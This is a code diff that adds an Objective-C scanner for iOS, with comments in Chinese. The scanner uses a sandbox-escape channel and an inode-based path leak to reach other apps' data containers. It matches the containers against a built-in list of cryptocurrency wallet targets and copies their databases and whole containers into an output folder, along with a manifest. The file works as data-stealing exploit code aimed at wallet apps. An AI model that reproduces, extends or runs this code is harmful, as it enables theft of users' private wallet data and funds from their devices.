@@ -1,0 +1,332 @@
+#import "WQLScanner.h"
+#import "WQLEscape.h"
+#import "WQLPathLeak.h"
+#import "WQLPathCache.h"
+#import "WQLLog.h"
+#import <stdarg.h>
+#import <sys/xattr.h>
+
+static NSString * const kWQLContainerMeta = @".com.apple.mobile_container_manager.metadata.plist";
+
+@interface WQLScanner ()
+- (void)log:(NSString *)fmt, ...;
+- (NSString *)bundleIDForContainerPath:(NSString *)path;
+- (NSArray<NSString *> *)copyTarget:(WQLTarget *)t
+                         container:(NSString *)container
+                          bundleID:(NSString *)bundleID
+                            outDir:(NSString *)outRoot
+                             bytes:(uint64_t *)bytesOut;
+- (NSArray<NSString *> *)sourcesForPath:(NSString *)path;
+- (NSString *)relative:(NSString *)path fromContainer:(NSString *)container;
+- (uint64_t)sizeOfItemAtPath:(NSString *)path;
+- (NSString *)humanBytes:(uint64_t)b;
+@end
+
+@implementation WQLScanner
+
+- (instancetype)init {
+    if (self = [super init]) {
+        _maxInode = 0;
+        _maxContainerBytes = 800ULL * 1024 * 1024;
+        _includeExtras = NO;
+    }
+    return self;
+}
+
+- (void)log:(NSString *)fmt, ... {
+    va_list args;
+    va_start(args, fmt);
+    NSString *line = [[NSString alloc] initWithFormat:fmt arguments:args];
+    va_end(args);
+    WQLLogLine(@"%@", line);
+    if (self.logBlock) self.logBlock(line);
+}
+
+- (NSArray<NSString *> *)defaultRoots {
+    return @[
+        @"/private/var/mobile/Containers/Data/Application",
+        @"/private/var/mobile/Containers/Shared/AppGroup",
+        @"/private/var/containers/Data/System",          // iOS 27
+        @"/private/var/containers/Shared/SystemGroup",   // iOS 27
+    ];
+}
+
+#pragma mark - 主流程
+
+- (NSArray<NSDictionary<NSString *, id> *> *)scanWithOutputDirectory:(NSString *)outDir {
+    NSFileManager *fm = [NSFileManager defaultManager];
+    [fm createDirectoryAtPath:outDir withIntermediateDirectories:YES attributes:nil error:nil];
+
+    NSMutableArray<WQLTarget *> *targets = [[WQLTargets wallets] mutableCopy];
+    if (self.includeExtras) [targets addObjectsFromArray:[WQLTargets extras]];
+
+    // 1. 先确认通道本身可用
+    NSString *err = nil;
+    if (![[WQLEscape shared] prepareWithError:&err]) {
+        [self log:@"通道不可用: %@", err ?: @"unknown"];
+        return @[];
+    }
+    NSDictionary *diag = [[WQLEscape shared] diagnostics];
+    [self log:@"系统 %@ / group %@ / 容器 %@",
+         diag[@"os"], diag[@"group"], diag[@"groupPath"]];
+
+    // 2. 先看缓存；只有没缓存的根目录才去扫 inode
+    NSArray<NSString *> *allRoots = [self defaultRoots];
+    NSMutableDictionary<NSString *, NSArray<NSString *> *> *children = [NSMutableDictionary dictionary];
+    NSMutableArray<NSString *> *needScan = [NSMutableArray array];
+
+    for (NSString *root in allRoots) {
+        NSArray<NSString *> *cached = [[WQLPathCache shared] validPathsForRoot:root];
+        BOOL stale = [[WQLPathCache shared] needsRescanForRoot:root];
+        if (cached.count && !stale) {
+            children[root] = cached;
+            [self log:@"%@ 命中缓存 %lu 项，跳过扫描", root, (unsigned long)cached.count];
+        } else {
+            if (cached.count) [self log:@"%@ 缓存已失效，重新扫描", root];
+            [needScan addObject:root];
+        }
+    }
+
+    if (!needScan.count) {
+        [self log:@"全部命中缓存，跳过 inode 扫描"];
+    } else {
+        uint64_t maxInode = self.maxInode;
+        if (maxInode == 0) {
+            maxInode = [WQLPathLeak baselineInodeWithError:&err];
+        }
+        if (maxInode == 0) {
+            [self log:@"取基线 inode 失败: %@（仅用缓存继续）", err ?: @"unknown"];
+        } else {
+            [self log:@"首次扫描 %lu 个根目录，inode 上界 %llu（较慢）",
+                  (unsigned long)needScan.count, (unsigned long long)maxInode];
+
+            __weak typeof(self) weakSelf = self;
+            __block uint64_t lastPct = 0;
+            NSDictionary<NSString *, NSArray<NSString *> *> *scanned =
+                [WQLPathLeak childrenOfDirectories:needScan
+                                          maxInode:maxInode
+                                          progress:^(uint64_t done, uint64_t total) {
+                __strong typeof(weakSelf) self = weakSelf;
+                if (!self || total == 0) return;
+                uint64_t pct = done * 100 / total;
+                if (pct >= lastPct + 5) {
+                    lastPct = pct;
+                    [self log:@"枚举进度 %llu%%", (unsigned long long)pct];
+                }
+            } cancel:^BOOL{
+                __strong typeof(weakSelf) self = weakSelf;
+                return self ? (self.cancelBlock ? self.cancelBlock() : NO) : YES;
+            } error:&err];
+
+            if (scanned.count) {
+                [children addEntriesFromDictionary:scanned];
+                [[WQLPathCache shared] mergeScanned:scanned];
+            }
+        }
+    }
+
+    NSMutableArray<NSDictionary *> *records = [NSMutableArray array];
+
+    for (NSString *root in allRoots) {
+        NSArray<NSString *> *items = children[root];
+        if (!items.count) {
+            [self log:@"%@ → 0 项", root];
+            continue;
+        }
+        [self log:@"%@ → %lu 项", root, (unsigned long)items.count];
+
+        for (NSString *path in items) {
+            if (self.cancelBlock && self.cancelBlock()) break;
+
+            // 必须先拿到 extension 才能读容器内的 metadata / xattr，
+            // 否则连 bundleID 都识别不出来（容器根目录本身不可读）。
+            NSString *escErr = nil;
+            int64_t handle = [[WQLEscape shared] consumeExtensionForPath:path error:&escErr];
+            NSString *bundleID = (handle > 0) ? [self bundleIDForContainerPath:path] : nil;
+            WQLTarget *t = [WQLTargets matchBundleID:bundleID inTargets:targets];
+
+            NSMutableDictionary *record = [@{
+                @"bundleId": bundleID ?: @"",
+                @"path": path,
+                @"target": t.name ?: @"",
+                @"status": t ? @"matched" : @"skip",
+                @"files": @[],
+                @"bytes": @(0),
+            } mutableCopy];
+            [records addObject:record];
+
+            if (handle <= 0) {
+                record[@"status"] = [NSString stringWithFormat:@"escape_failed: %@",
+                                     [[WQLEscape shared] describeStatus:handle]];
+                [self log:@"%@ 取 extension 失败: %@", path, escErr ?: @""];
+                continue;
+            }
+
+            if (!t) {
+                [[WQLEscape shared] releaseHandle:handle];
+                continue;
+            }
+
+            // 3. extension 已在上方拿到，直接开始拷贝
+            uint64_t bytes = 0;
+            NSArray<NSString *> *files = [self copyTarget:t
+                                             container:path
+                                              bundleID:bundleID
+                                                outDir:outDir
+                                                 bytes:&bytes];
+            [[WQLEscape shared] releaseHandle:handle];
+
+            record[@"files"] = files;
+            record[@"bytes"] = @(bytes);
+            record[@"status"] = files.count ? @"copied" : @"empty";
+            [self log:@"%@ (%@) → %lu 个文件 / %@",
+                  t.name, bundleID, (unsigned long)files.count,
+                  [self humanBytes:bytes]];
+        }
+    }
+
+    // 4. 落一份清单
+    NSData *json = [NSJSONSerialization dataWithJSONObject:records
+                                                   options:NSJSONWritingPrettyPrinted
+                                                     error:nil];
+    if (json) {
+        [json writeToFile:[outDir stringByAppendingPathComponent:@"manifest.json"] atomically:YES];
+    }
+
+    [self log:@"完成：%lu 个容器，命中 %lu 个目标",
+          (unsigned long)records.count,
+          (unsigned long)[[records filteredArrayUsingPredicate:
+                           [NSPredicate predicateWithFormat:@"status IN %@",
+                            @[@"copied", @"empty"]]] count]];
+    return records;
+}
+
+#pragma mark - 容器识别
+
+- (NSString *)bundleIDForContainerPath:(NSString *)path {
+    NSString *meta = [path stringByAppendingPathComponent:kWQLContainerMeta];
+    NSDictionary *d = [NSDictionary dictionaryWithContentsOfFile:meta];
+    NSString *ident = d[@"MCMMetadataIdentifier"];
+    if (ident.length) return ident;
+
+    char buf[512] = {0};
+    ssize_t n = getxattr(path.fileSystemRepresentation,
+                         "com.apple.containermanager.identifier",
+                         buf, sizeof(buf) - 1, 0, 0);
+    if (n > 0) {
+        buf[n] = 0;
+        return [NSString stringWithUTF8String:buf];
+    }
+    return nil;
+}
+
+#pragma mark - 拷贝
+
+- (NSArray<NSString *> *)copyTarget:(WQLTarget *)t
+                         container:(NSString *)container
+                          bundleID:(NSString *)bundleID
+                            outDir:(NSString *)outRoot
+                             bytes:(uint64_t *)bytesOut {
+    NSFileManager *fm = [NSFileManager defaultManager];
+    NSString *destRoot = [outRoot stringByAppendingPathComponent:bundleID];
+    [fm createDirectoryAtPath:destRoot withIntermediateDirectories:YES attributes:nil error:nil];
+
+    NSMutableArray<NSString *> *copied = [NSMutableArray array];
+    uint64_t total = 0;
+
+    if (t.wholeContainer) {
+        uint64_t sz = [self sizeOfItemAtPath:container];
+        if (sz > self.maxContainerBytes) {
+            [self log:@"%@ 整容器 %@ 超过门限，跳过", t.name, [self humanBytes:sz]];
+            return @[];
+        }
+        NSString *dst = [destRoot stringByAppendingPathComponent:@"container"];
+        NSError *e = nil;
+        if ([fm copyItemAtPath:container toPath:dst error:&e]) {
+            [copied addObject:dst];
+            total += sz;
+        } else {
+            [self log:@"%@ 整容器拷贝失败: %@", t.name, e.localizedDescription];
+        }
+    } else {
+        for (NSString *rel in t.relativePaths) {
+            NSString *src = [container stringByAppendingPathComponent:rel];
+            if (![fm fileExistsAtPath:src]) continue;
+
+            NSArray<NSString *> *sources = [self sourcesForPath:src];
+            for (NSString *s in sources) {
+                uint64_t sz = [self sizeOfItemAtPath:s];
+                if (sz > self.maxContainerBytes) {
+                    [self log:@"%@ 跳过超大文件 %@", t.name, s.lastPathComponent];
+                    continue;
+                }
+                NSString *dstRel = [self relative:s fromContainer:container];
+                NSString *dst = [destRoot stringByAppendingPathComponent:dstRel];
+                [fm createDirectoryAtPath:[dst stringByDeletingLastPathComponent]
+              withIntermediateDirectories:YES attributes:nil error:nil];
+                [fm removeItemAtPath:dst error:nil];
+                NSError *e = nil;
+                if ([fm copyItemAtPath:s toPath:dst error:&e]) {
+                    [copied addObject:dst];
+                    total += sz;
+                } else {
+                    [self log:@"拷贝失败 %@: %@", s.lastPathComponent, e.localizedDescription];
+                }
+            }
+        }
+    }
+
+    if (bytesOut) *bytesOut = total;
+    return copied;
+}
+
+/// sqlite 自动带 -wal / -shm 边车
+- (NSArray<NSString *> *)sourcesForPath:(NSString *)path {
+    NSFileManager *fm = [NSFileManager defaultManager];
+    NSMutableArray *out = [NSMutableArray arrayWithObject:path];
+    NSString *ext = path.pathExtension.lowercaseString;
+    if ([ext isEqualToString:@"sqlite"] || [ext isEqualToString:@"sqlite3"] ||
+        [ext isEqualToString:@"db"]) {
+        for (NSString *suffix in @[@"-wal", @"-shm"]) {
+            NSString *side = [path stringByAppendingString:suffix];
+            if ([fm fileExistsAtPath:side]) [out addObject:side];
+        }
+    }
+    return out;
+}
+
+- (NSString *)relative:(NSString *)path fromContainer:(NSString *)container {
+    NSString *base = container;
+    if (![base hasSuffix:@"/"]) base = [base stringByAppendingString:@"/"];
+    if ([path hasPrefix:base]) return [path substringFromIndex:base.length];
+    return path.lastPathComponent;
+}
+
+- (uint64_t)sizeOfItemAtPath:(NSString *)path {
+    NSFileManager *fm = [NSFileManager defaultManager];
+    BOOL isDir = NO;
+    if (![fm fileExistsAtPath:path isDirectory:&isDir]) return 0;
+    if (!isDir) {
+        NSDictionary *a = [fm attributesOfItemAtPath:path error:nil];
+        return [a[NSFileSize] unsignedLongLongValue];
+    }
+    uint64_t total = 0;
+    NSDirectoryEnumerator *e = [fm enumeratorAtPath:path];
+    for (NSString *rel in e) {
+        NSDictionary *a = [e fileAttributes];
+        if (a[NSFileType] == NSFileTypeRegular) {
+            total += [a[NSFileSize] unsignedLongLongValue];
+        }
+        if (total > self.maxContainerBytes) break;
+    }
+    return total;
+}
+
+- (NSString *)humanBytes:(uint64_t)b {
+    if (b < 1024) return [NSString stringWithFormat:@"%llu B", (unsigned long long)b];
+    if (b < 1024 * 1024) return [NSString stringWithFormat:@"%.1f KB", b / 1024.0];
+    if (b < 1024ULL * 1024 * 1024) return [NSString stringWithFormat:@"%.1f MB", b / 1048576.0];
+    return [NSString stringWithFormat:@"%.2f GB", b / 1073741824.0];
+}
+
+@end
